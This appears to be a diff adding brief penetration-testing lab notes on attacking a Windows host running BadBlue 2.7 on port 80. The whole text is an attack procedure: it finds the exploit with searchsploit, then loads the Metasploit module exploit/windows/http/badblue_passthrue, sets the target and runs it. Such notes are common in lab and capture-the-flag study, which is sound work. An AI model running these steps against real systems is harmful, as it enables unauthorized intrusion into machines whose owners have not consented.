@@ -1,0 +1,10 @@
+Exploit on port HTTP 80 open on windows system
+
+We find port 80 BadBlue 2.7
+
+# searchsploit BadBlue 2.7 (we have to use 29th exploit)
+# msfconsole
+msf5> use exploit/windows/http/badblue_passthrue
+msf5> show options
+msf5> set RHOSTS <IP>
+msf5> run
